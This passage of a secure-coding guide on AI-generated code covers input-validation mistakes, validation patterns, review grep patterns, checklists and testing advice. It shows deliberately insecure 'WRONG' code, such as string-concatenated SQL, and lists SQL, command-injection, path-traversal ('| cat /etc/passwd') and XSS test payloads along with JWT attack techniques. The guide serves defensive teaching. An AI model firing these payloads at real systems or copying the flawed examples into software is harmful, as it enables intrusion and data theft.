        "bio": htmlEncode(userData.bio)
    })
```

**Why This Is Wrong:**
- Validation should happen at input boundary, not output
- Formatted/encoded data may pass validation but still be dangerous
- Encoding should happen at output, specific to context
- Validation after formatting is security theater

---

### Common Mistake 2: Using String Operations on Binary Data

```pseudocode
// WRONG: String operations on binary data
function processUploadedImage(fileContent):
    // Convert binary to string - CORRUPTS DATA
    contentString = fileContent.toString("utf-8")

    // String operations fail on binary
    if contentString.startsWith("\x89PNG"):  // May not work correctly
        processImage(contentString)  // Corrupted!

    // Regex on binary data is meaningless
    if regex.match("<script>", contentString):  // False sense of security
        return error("Invalid image")

// CORRECT: Use binary operations for binary data
function processUploadedImage(fileContent):
    // Keep as binary buffer
    buffer = fileContent  // Raw bytes

    // Check magic bytes using binary comparison
    PNG_MAGIC = bytes([0x89, 0x50, 0x4E, 0x47])  // \x89PNG
    JPEG_MAGIC = bytes([0xFF, 0xD8, 0xFF])

    if buffer.slice(0, 4) == PNG_MAGIC:
        imageType = "png"
    else if buffer.slice(0, 3) == JPEG_MAGIC:
        imageType = "jpeg"
    else:
        return error("Unsupported image format")

    // Use dedicated image library for validation
    try:
        image = imageLibrary.load(buffer)

        // Validate image properties
        if image.width > MAX_WIDTH or image.height > MAX_HEIGHT:
            return error("Image too large")

        // Re-encode image (strips any embedded code)
        cleanBuffer = imageLibrary.encode(image, imageType)
        return {valid: true, content: cleanBuffer}

    catch ImageError:
        return error("Invalid image file")
```

**Why This Is Wrong:**
- UTF-8 decoding corrupts binary data with invalid sequences
- String operations assume text encoding that doesn't apply
- Regex cannot meaningfully match binary patterns
- Magic byte checks should use binary comparison

---

### Common Mistake 3: Inconsistent Validation Across Endpoints

```pseudocode
// WRONG: Different validation in different places
// API Endpoint 1: Strict validation
function createUserApi(request):
    if not isValidEmail(request.email):
        return error("Invalid email")
    if not isStrongPassword(request.password):
        return error("Weak password")
    createUser(request.email, request.password)

// API Endpoint 2: No validation (developer forgot)
function createUserFromOAuth(oauthData):
    // Trust OAuth provider's email
    createUser(oauthData.email, generateRandomPassword())

// Internal function: Also no validation (assumes callers validated)
function createUserInternal(email, password):
    // Directly insert to database - SQL injection if email not validated upstream
    query = "INSERT INTO users (email, password) VALUES ('" + email + "', ?)"
    database.execute(query, [password])

// CORRECT: Centralized validation
class UserValidator:
    function validateEmail(email):
        if email is null or email is empty:
            throw ValidationError("Email required")
        if length(email) > 254:
            throw ValidationError("Email too long")
        if not regex.match(EMAIL_PATTERN, email):
            throw ValidationError("Invalid email format")
        return email.toLowerCase().trim()

    function validatePassword(password):
        // ... password validation
        return password

    function validateUserData(data):
        return {
            "email": this.validateEmail(data.email),
            "password": this.validatePassword(data.password)
        }

// Single creation function used by all endpoints
function createUser(data):
    validated = UserValidator.validateUserData(data)

    // Now safe to use parameterized query
    query = "INSERT INTO users (email, password) VALUES (?, ?)"
    database.execute(query, [validated.email, hashPassword(validated.password)])

// All endpoints use the same function
function createUserApi(request):
    createUser(request.body)

function createUserFromOAuth(oauthData):
    createUser({"email": oauthData.email, "password": generateRandomPassword()})
```

**Why This Is Wrong:**
- Multiple code paths = multiple places to forget validation
- Different validation rules cause inconsistent security posture
- Internal functions shouldn't trust callers validated correctly
- Centralized validation ensures consistent security

---

## Validation Framework Patterns

### Pattern 1: Layered Validation Architecture

```pseudocode
// Layer 1: Transport-level validation (before application code)
// - Request size limits
// - Content-Type checking
// - Rate limiting
// Typically configured in web server/framework

// Layer 2: Schema validation (structure and types)
function validateSchema(data, schema):
    return schemaValidator.validate(data, schema)

// Layer 3: Format validation (syntax)
function validateFormats(data):
    errors = []
    if data.email and not isValidEmailFormat(data.email):
        errors.append("Invalid email format")
    if data.url and not isValidUrl(data.url):
        errors.append("Invalid URL format")
    return errors

// Layer 4: Business rule validation (semantics)
function validateBusinessRules(data, context):
    errors = []
    if data.endDate < data.startDate:
        errors.append("End date must be after start date")
    if data.quantity > context.inventory.available:
        errors.append("Insufficient inventory")
    return errors

// Orchestration
function validateRequest(request, schema, context):
    // Layer 2: Schema
    schemaResult = validateSchema(request.body, schema)
    if not schemaResult.valid:
        return {valid: false, errors: schemaResult.errors, layer: "schema"}

    // Layer 3: Format
    formatErrors = validateFormats(request.body)
    if formatErrors.length > 0:
        return {valid: false, errors: formatErrors, layer: "format"}

    // Layer 4: Business rules
    businessErrors = validateBusinessRules(request.body, context)
    if businessErrors.length > 0:
        return {valid: false, errors: businessErrors, layer: "business"}

    return {valid: true, data: request.body}
```

### Pattern 2: Validation Pipeline with Short-Circuit

```pseudocode
// Define validators as composable functions
validators = [
    (data) => checkRequired(data, ["email", "password"]),
    (data) => checkTypes(data, {email: "string", password: "string"}),
    (data) => checkLength(data.email, 1, 254),
    (data) => checkLength(data.password, 12, 128),
    (data) => checkFormat(data.email, EMAIL_PATTERN),
    (data) => checkPasswordStrength(data.password),
    (data) => checkEmailNotRegistered(data.email)  // Async/DB check
]

function validatePipeline(data, validators):
    for validator in validators:
        result = validator(data)
        if not result.valid:
            return result  // Short-circuit on first failure
    return {valid: true, data: data}

// Usage
result = validatePipeline(requestData, validators)
if not result.valid:
    return error(result.message)
processValidatedData(result.data)
```

### Pattern 3: Declarative Field Validation

```pseudocode
// Define validation rules per field
FIELD_RULES = {
    "email": {
        required: true,
        type: "string",
        maxLength: 254,
        format: "email",
        transform: (v) => v.toLowerCase().trim()
    },
    "age": {
        required: true,
        type: "integer",
        min: 0,
        max: 150
    },
    "role": {
        required: true,
        type: "string",
        enum: ["user", "admin", "moderator"]
    },
    "tags": {
        required: false,
        type: "array",
        items: {
            type: "string",
            maxLength: 50,
            pattern: "^[a-z0-9-]+$"
        },
        maxItems: 10
    }
}

function validateFields(data, rules):
    result = {}
    errors = []

    for fieldName, fieldRules in rules:
        value = data[fieldName]

        // Required check
        if fieldRules.required and (value is null or value is undefined):
            errors.append({field: fieldName, message: "Required"})
            continue

        // Skip optional empty fields
        if value is null or value is undefined:
            continue

        // Type check
        if typeof(value) != fieldRules.type:
            errors.append({field: fieldName, message: "Invalid type"})
            continue

        // Apply transform if exists
        if fieldRules.transform:
            value = fieldRules.transform(value)

        // Range/length checks based on type
        error = validateFieldConstraints(value, fieldRules)
        if error:
            errors.append({field: fieldName, message: error})
            continue

        result[fieldName] = value

    if errors.length > 0:
        return {valid: false, errors: errors}
    return {valid: true, data: result}
```

---

## Detection Hints: How to Spot Missing Validation

### Code Review Patterns

```pseudocode
// 1. Request body used directly without validation
request.body.xxx      // Search for: request\.body\.\w+
req.params.xxx        // Search for: req\.params\.\w+
request.query.xxx     // Search for: request\.query\.\w+

// 2. Missing null checks before property access
user.profile.address  // Search for: \w+\.\w+\.\w+ (chained access without ?.)
data.items[0]         // Search for: \w+\[\d+\] (hardcoded array index)

// 3. Type coercion without validation
parseInt(xxx)         // Search for: parseInt\([^,]+\) (no radix)
Number(xxx)           // Search for: Number\(\w+
parseFloat(xxx)       // Without subsequent isNaN check

// 4. Regex without anchors
/pattern/             // Search for: /[^/^][^$]+[^$/]/ (no ^ or $)
new RegExp("xxx")     // Search for: new RegExp\("[^^]

// 5. Client-side validation only
if (form.valid)       // Look for validation in frontend, missing in backend
validate()            // In JS files, search corresponding backend endpoint

// 6. Array access from user input
array[userInput]      // Search for: \[\w+\.\w+\] (property access with user data)
object[key]           // Where key comes from request

// GREP patterns for security review:
// request\.(body|params|query)\.\w+
// parseInt\([^,)]+\)(?!\s*,\s*10)
// \.\w+\.\w+\.\w+(?!\?)
// /[^/]+/(?!.*[^\\]\$)
```

### Testing Patterns

```pseudocode
// Automated validation testing checklist:

// 1. Boundary testing
- Test with null, undefined, empty string for all fields
- Test with max length + 1 characters
- Test with min - 1 and max + 1 for numeric ranges
- Test with integer overflow values (2^31, 2^32, 2^64)

// 2. Type confusion testing
- Send array where string expected: {"email": ["test@test.com"]}
- Send object where string expected: {"email": {"$gt": ""}}
- Send number where string expected: {"email": 12345}
- Send boolean where string expected: {"email": true}

// 3. Encoding bypass testing
- URL encoding: %00, %2e%2e%2f
- Unicode encoding: \u0000, \u002e
- Double encoding: %2500
- Mixed case: %2E%2e%2F

// 4. Injection payload testing
- SQL: ' OR '1'='1, '; DROP TABLE users; --
- Command: ; ls, | cat /etc/passwd, `whoami`
- Path: ../../../etc/passwd, ....//....//
- XSS: <script>alert(1)</script>, javascript:alert(1)

// 5. ReDoS testing
- For each regex, test with pattern: (valid_char * 30) + invalid_char
- Measure response time - should be < 100ms
- Exponential time indicates ReDoS vulnerability
```

---

## Security Checklist

- [ ] All user input validated on the server side (never trust client-side only)
- [ ] Schema validation enforces expected structure (`additionalProperties: false`)
- [ ] All required fields checked for null/undefined/empty
- [ ] String lengths validated with reasonable maximums (prevents DoS)
- [ ] Numeric values validated for type, range, and overflow potential
- [ ] Arrays validated for max length and item constraints
- [ ] Enum fields validated against explicit allowlist
- [ ] All regex patterns anchored with `^` and `$`
- [ ] Regex patterns tested for ReDoS vulnerability
- [ ] Length checked BEFORE regex matching (ReDoS mitigation)
- [ ] Timeout protection on regex operations (defense in depth)
- [ ] Unicode input normalized before validation (NFC/NFKC)
- [ ] Null bytes (`\x00`, `%00`) rejected in string input
- [ ] Path inputs canonicalized and validated against allowed directories
- [ ] URL inputs parsed and validated (scheme, host, no credentials)
- [ ] File uploads validated by both extension AND content type
- [ ] Integer arithmetic checked for overflow before computation
- [ ] Type coercion explicit with proper error handling
- [ ] Validation consistent across all endpoints (centralized validators)
- [ ] Error messages helpful but don't leak validation logic details
- [ ] Validation rules documented and version controlled
- [ ] Validation tested with fuzzing and boundary values

---

# Executive Summary

## The 6 Critical Security Anti-Patterns

This document provides comprehensive coverage of the **6 most critical and commonly occurring security vulnerabilities** in AI-generated code. Together, these patterns represent the root causes of the vast majority of security incidents in AI-assisted development.

### Pattern Overview

| # | Pattern | Risk Level | AI Frequency | Key Threat |
|---|---------|------------|--------------|------------|
| 1 | **Hardcoded Secrets** | Critical | Very High | Credential theft, API abuse, data breaches |
| 2 | **SQL/Command Injection** | Critical | High | Database compromise, RCE, system takeover |
| 3 | **Cross-Site Scripting (XSS)** | High | Very High | Session hijacking, account takeover, defacement |
| 4 | **Authentication/Session** | Critical | High | Complete authentication bypass, privilege escalation |
| 5 | **Cryptographic Failures** | High | Very High | Data decryption, credential exposure, forgery |
| 6 | **Input Validation** | High | Very High | Enables all other injection attacks |

### Why These 6 Patterns Matter

**They are interconnected:** Input validation failures enable injection attacks. Cryptographic failures expose the secrets that hardcoded credentials would have protected. Authentication weaknesses make XSS more devastating.

**AI models struggle with all of them:** Training data contains countless examples of insecure patterns. AI models optimize for "working code" rather than "secure code." The patterns that make code secure are often invisible (environment variables, parameterized queries, proper encoding) while insecure patterns are explicit and visible.

**They have compounding effects:** A single hardcoded secret can expose thousands of users. A single SQL injection can dump an entire database. A single XSS vulnerability can persist across sessions and users.

---

# Critical Checklists: One-Line Reminders

These condensed checklists provide quick reference for each pattern. Use during code review or before committing changes.

## Pattern 1: Hardcoded Secrets

| ✓ | Checkpoint |
|---|------------|
| □ | No API keys, passwords, or tokens in source files |
| □ | All secrets loaded from environment variables or secret managers |
| □ | `.env` files in `.gitignore` with `.env.example` for templates |
| □ | No secrets in logs, error messages, or URLs |
| □ | Secret scanning enabled in CI/CD pipeline |
| □ | Credentials rotated regularly and rotation is automated |

## Pattern 2: SQL/Command Injection

| ✓ | Checkpoint |
|---|------------|
| □ | All SQL queries use parameterized statements (no string concatenation) |
| □ | Dynamic identifiers (table/column names) validated against allowlist |
| □ | ORM queries reviewed for raw query vulnerabilities |
| □ | Shell commands avoid user input; if required, use allowlist validation |
| □ | Second-order injection checked (stored data used in queries) |
| □ | Prepared statements used for ALL query types (SELECT, INSERT, ORDER BY) |

## Pattern 3: Cross-Site Scripting (XSS)

| ✓ | Checkpoint |
|---|------------|
| □ | HTML encoding for HTML body context |
| □ | Attribute encoding for HTML attributes (especially event handlers) |
| □ | JavaScript encoding for inline scripts |
| □ | URL encoding for URL contexts |
| □ | CSP headers configured with strict policy (no `unsafe-inline`) |
| □ | `innerHTML` avoided; use `textContent` or framework safe bindings |
| □ | Sanitization libraries tested against mutation XSS |

## Pattern 4: Authentication/Session Security

| ✓ | Checkpoint |
|---|------------|
| □ | Passwords hashed with bcrypt/Argon2 (not MD5/SHA1) |
| □ | Session tokens cryptographically random (256+ bits entropy) |
| □ | JWT algorithm explicitly validated (`alg: none` rejected) |
| □ | Tokens stored in HttpOnly, Secure, SameSite cookies |
| □ | Session invalidated on logout (server-side) |
| □ | Constant-time comparison for password/token verification |
| □ | Rate limiting on authentication endpoints |

## Pattern 5: Cryptographic Failures

| ✓ | Checkpoint |
|---|------------|
| □ | AES-256-GCM or ChaCha20-Poly1305 for symmetric encryption |
| □ | Fresh random IV/nonce for every encryption operation |
| □ | CSPRNG used for all security-sensitive random values |
| □ | bcrypt/Argon2id for password hashing (not PBKDF2 for passwords) |
| □ | Key derivation uses HKDF or PBKDF2 with appropriate iterations |
| □ | No ECB mode, no static IVs, no Math.random() |
| □ | Constant-time comparison for MAC/signature verification |

## Pattern 6: Input Validation

| ✓ | Checkpoint |
|---|------------|
| □ | All validation performed on server side |
| □ | Schema validation with `additionalProperties: false` |
| □ | All regex patterns anchored with `^` and `$` |
| □ | Length limits checked BEFORE regex matching |
| □ | Null bytes rejected in string input |
| □ | Unicode normalized before validation |
| □ | Type coercion explicit with error handling |

---

# Testing Recommendations by Vulnerability Type

## Hardcoded Secrets Testing

```pseudocode
// Automated Secret Detection
1. Pre-commit hooks with secret scanners:
   - TruffleHog
   - detect-secrets
   - gitleaks
   - git-secrets

2. CI/CD Pipeline Scanning:
   - Run on every PR/MR
   - Scan full git history on merge to main
   - Block deployment on secret detection

3. Runtime Detection:
   - Log analysis for credential patterns
   - API request auditing for hardcoded keys
   - Cloud provider secret exposure alerts

// Testing Checklist
- [ ] Scan all source files for API key patterns
- [ ] Scan all config files for password strings
- [ ] Check git history for past secret commits
- [ ] Verify environment variables are properly loaded
- [ ] Test application behavior when secrets are missing
- [ ] Verify secrets are not exposed in error messages
```

## SQL/Command Injection Testing

```pseudocode
// Automated Testing Tools
1. SAST (Static Analysis):
   - Semgrep with injection rules
   - CodeQL injection queries
   - SonarQube SQL injection checks

2. DAST (Dynamic Analysis):
   - SQLMap for SQL injection
   - Burp Suite active scanning
   - OWASP ZAP automated scan

3. Manual Testing Payloads:
   // SQL Injection
   - Single quote: '
   - Comment: -- or #
   - Boolean: ' OR '1'='1
   - Time-based: '; WAITFOR DELAY '0:0:10'--
   - Union: ' UNION SELECT null,null--

   // Command Injection
   - Semicolon: ;whoami
   - Pipe: |id
   - Backticks: `whoami`
   - Command substitution: $(whoami)
   - Newline: %0a id

// Testing Checklist
- [ ] Test all user input fields with injection payloads
- [ ] Test ORDER BY, LIMIT, table name parameters
- [ ] Test stored data for second-order injection
- [ ] Test file paths for command injection
- [ ] Verify all queries use parameterization
- [ ] Check logs don't reveal injection success/failure
```

## XSS Testing

```pseudocode
// Automated Testing
1. Browser Tools:
   - DOM Invader (Burp)
   - XSS Hunter
   - DOMPurify testing mode

2. Automated Scanners:
   - Burp Suite XSS scanner
   - OWASP ZAP active scan
   - Nuclei XSS templates

3. Manual Testing Payloads:
   // HTML Context
   - <script>alert(1)</script>
   - <img src=x onerror=alert(1)>
   - <svg onload=alert(1)>

   // Attribute Context
   - " onmouseover="alert(1)
   - ' onfocus='alert(1)' autofocus='

   // JavaScript Context
   - '-alert(1)-'
   - ';alert(1)//
   - \u003cscript\u003e

   // URL Context
   - javascript:alert(1)
   - data:text/html,<script>alert(1)</script>

// Testing Checklist
- [ ] Test all output points with context-specific payloads
- [ ] Test encoding bypass techniques
- [ ] Test DOM XSS with source/sink analysis
- [ ] Verify CSP headers block inline scripts
- [ ] Test mutation XSS with sanitizer bypass payloads
- [ ] Check for polyglot XSS across contexts
```

## Authentication/Session Testing

```pseudocode
// Testing Tools
1. Session Analysis:
   - Burp Suite session handling
   - OWASP ZAP session management
   - Custom scripts for token analysis

2. JWT Testing:
   - jwt.io debugger
   - jwt_tool
   - jose library testing

3. Manual Testing:
   // Session Token Analysis
   - Check entropy (should be 256+ bits)
   - Test token predictability
   - Test session fixation

   // JWT Attacks
   - Algorithm confusion (RS256 → HS256)
   - None algorithm bypass
   - Key injection attacks
   - Signature stripping

   // Authentication Bypass
   - SQL injection in login
   - Password reset token prediction
   - OAuth state parameter manipulation

// Testing Checklist
- [ ] Test session token randomness
- [ ] Verify session invalidation on logout
- [ ] Test for session fixation
- [ ] Verify JWT algorithm validation
- [ ] Test rate limiting on login
- [ ] Check for timing attacks on password comparison
- [ ] Test password reset flow for token issues
```

## Cryptographic Implementation Testing

```pseudocode
// Crypto Testing Tools
1. Static Analysis:
   - Semgrep crypto rules
   - CryptoGuard
   - Crypto-detector

2. Manual Review:
   // Check for weak algorithms:
   grep -r "MD5\|SHA1\|DES\|RC4\|ECB" .

   // Check for static IVs:
   grep -r "iv\s*=\s*[\"'][0-9a-fA-F]+[\"']" .

   // Check for weak randomness:
   grep -r "Math\.random\|random\.random\|rand\(\)" .

3. Runtime Testing:
   - Encrypt same plaintext twice, verify different ciphertext
   - Test key derivation iterations (should take 100ms+)
   - Verify timing consistency in comparisons

// Testing Checklist
- [ ] Verify no MD5/SHA1/DES/RC4/ECB usage
- [ ] Confirm unique IV/nonce per encryption
- [ ] Test password hashing takes appropriate time (100ms+)
- [ ] Verify CSPRNG used for all secrets
- [ ] Check key derivation iteration counts
- [ ] Test for padding oracle vulnerabilities
- [ ] Verify constant-time comparison functions
```

## Input Validation Testing

```pseudocode
// Testing Approach
1. Boundary Testing:
   - Empty strings, null, undefined
   - Max length + 1
   - Integer boundaries (MAX_INT, MIN_INT)
   - Unicode normalization variants

2. Type Confusion:
   - Array where string expected: ["value"]
   - Object where string expected: {"$gt": ""}
   - Number where string expected: 12345
   - Boolean where object expected: true

3. Encoding Bypass:
   - URL encoding: %00, %2e%2e%2f
   - Unicode: \u0000, \ufeff
   - Double encoding: %252e
   - Overlong UTF-8

4. ReDoS Testing:
   - For each regex, test with: (valid_char * 30) + invalid_char
   - Measure response time (should be < 100ms)
   - Use regex-dos-detector tools

// Testing Checklist
- [ ] Test all endpoints with null/empty values
- [ ] Test numeric fields with boundary values
- [ ] Test string fields with max length exceeded
- [ ] Test type confusion for all input fields
- [ ] Test regex patterns for ReDoS
- [ ] Verify server-side validation matches client-side
- [ ] Test Unicode normalization issues
```

---

# Additional Patterns Reference

This depth document covers the 6 most critical patterns in extensive detail. For coverage of additional security anti-patterns, see [[ANTI_PATTERNS_BREADTH]], which includes:

| Pattern Category | Patterns Covered |
|-----------------|------------------|
| **File System Security** | Path traversal, unsafe file uploads, insecure temp files |
| **Access Control** | Missing authorization checks, IDOR, privilege escalation |
| **Network Security** | SSRF, insecure deserialization, unvalidated redirects |
| **Error Handling** | Information disclosure, stack traces, verbose errors |
| **Logging Security** | Sensitive data in logs, insufficient logging |
| **Concurrency** | Race conditions, TOCTOU, deadlocks |
| **Dependency Security** | Outdated dependencies, slopsquatting, lockfile tampering |
| **Configuration** | Debug mode in production, default credentials |
| **API Security** | Mass assignment, excessive data exposure, rate limiting |

Use the breadth document for quick reference across many patterns. Use this depth document for comprehensive understanding of the most critical patterns.

---

# External Resources

## OWASP Resources

- **OWASP Top 10 (2021):** https://owasp.org/Top10/
- **OWASP Cheat Sheet Series:** https://cheatsheetseries.owasp.org/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **OWASP ASVS:** https://owasp.org/www-project-application-security-verification-standard/

### Relevant Cheat Sheets

| Pattern | OWASP Cheat Sheet |
|---------|-------------------|
| Secrets Management | [Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) |
| SQL Injection | [Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html) |
| XSS | [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| Authentication | [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) |
| Session Management | [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) |
| Cryptography | [Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) |
| Input Validation | [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) |

## CWE References

- **CWE Top 25 (2024):** https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html
- **CWE/SANS Top 25:** https://www.sans.org/top25-software-errors/

### CWE Mappings for This Document

| Pattern | Primary CWEs |
|---------|--------------|
| Hardcoded Secrets | CWE-798, CWE-259, CWE-321, CWE-200 |
| SQL Injection | CWE-89, CWE-564 |
| Command Injection | CWE-78, CWE-77 |
| XSS | CWE-79, CWE-80, CWE-83, CWE-87 |
| Authentication | CWE-287, CWE-384, CWE-613, CWE-307 |
| Session Security | CWE-384, CWE-613, CWE-614, CWE-1004 |
| Cryptographic Failures | CWE-327, CWE-328, CWE-329, CWE-338, CWE-916 |
| Input Validation | CWE-20, CWE-1333, CWE-185, CWE-176 |

## AI Code Security Research

- **GitHub Copilot Security Analysis:** https://arxiv.org/abs/2108.09293
- **Stanford/Asleep at the Keyboard Study:** https://arxiv.org/abs/2211.03622
- **USENIX Package Hallucination Study (2024):** https://www.usenix.org/conference/usenixsecurity24
- **Veracode State of Software Security (2024-2025):** https://www.veracode.com/state-of-software-security-report
- **Snyk Developer Security Survey (2024):** https://snyk.io/reports/

## Security Testing Tools

| Tool | Purpose | URL |
|------|---------|-----|
| Semgrep | Static analysis with security rules | https://semgrep.dev |
| CodeQL | GitHub security queries | https://codeql.github.com |
| TruffleHog | Secret scanning | https://github.com/trufflesecurity/trufflehog |
| SQLMap | SQL injection testing | https://sqlmap.org |
| Burp Suite | Web security testing | https://portswigger.net/burp |
| OWASP ZAP | Open source web security scanner | https://www.zaproxy.org |
| jwt_tool | JWT security testing | https://github.com/ticarpi/jwt_tool |
| gitleaks | Git secret scanning | https://github.com/gitleaks/gitleaks |

---

# Document Information

**Document:** AI Code Security Anti-Patterns: Depth Version
**Version:** 1.0.0
**Last Updated:** 2026-01-18
**Patterns Covered:** 6 (Hardcoded Secrets, SQL/Command Injection, XSS, Authentication/Session, Cryptography, Input Validation)

## Change Log

| Date | Version | Changes |
|------|---------|---------|
| 2026-01-18 | 1.0.0 | Initial release with 6 comprehensive pattern deep-dives |

## Related Documents

- [[ANTI_PATTERNS_BREADTH]] - Quick reference covering 25+ security patterns
- [[Ranking-Matrix]] - Priority scoring methodology and pattern rankings
- [[Pseudocode-Examples]] - Additional code examples for all patterns

## Contributing

This document is maintained as part of the AI Code Security Anti-Patterns project. Security patterns evolve as new research emerges and AI models change. Contributions welcome for:

- New edge cases and exploitation techniques
- Updated statistics and research citations
- Additional testing methodologies
- Framework-specific secure coding examples

---

*This document is designed to be included in AI assistant context windows to improve the security of generated code. For maximum effectiveness, include along with [[ANTI_PATTERNS_BREADTH]] when reviewing or generating security-sensitive code.*

---

**END OF DOCUMENT**
